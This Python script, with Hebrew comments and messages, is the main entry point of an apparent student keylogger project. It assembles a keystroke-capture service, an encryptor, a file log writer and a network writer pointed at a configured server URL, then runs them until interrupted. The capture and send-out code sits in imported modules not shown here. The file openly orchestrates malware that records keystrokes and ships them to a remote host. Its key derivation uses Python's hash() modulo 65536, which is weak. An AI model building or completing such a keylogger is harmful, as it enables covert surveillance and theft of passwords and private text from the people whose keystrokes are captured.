from services.KeyLoggerService import Keyloggerservice
from services.file_writer import FileWriter
from services.networkwriter import NetworkWriter
from encryption.encryptor import Encryptor
from managers.keyLoggerManager import KeyloggerManager
from config import Config
import time
import socket

def main():
    encryption_key = Config.ENCRYPTION_KEY
    if isinstance(encryption_key, str):
        encryption_key = hash(encryption_key) % 65536  # המר למספר
    
    encryptor = Encryptor(key=encryption_key)
    file_writer = FileWriter(Config.LOG_DIRECTORY)  
    network_writer = NetworkWriter(key=encryption_key, server_url=Config.SERVER_URL)
    keylogger = Keyloggerservice()
    
    manager = KeyloggerManager(
        keylogger_service=keylogger, 
        file_writer=file_writer,     
        network_writer=network_writer,
        encryptor=encryptor         
    )
    
    print("🚀 KeyLogger Manager התחיל לרוץ...")
    manager.start()  
    
    try:
        while manager.is_running():
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n⏹️  עוצר את KeyLogger Manager...")
        manager.stop()

if __name__ == "__main__":
    main()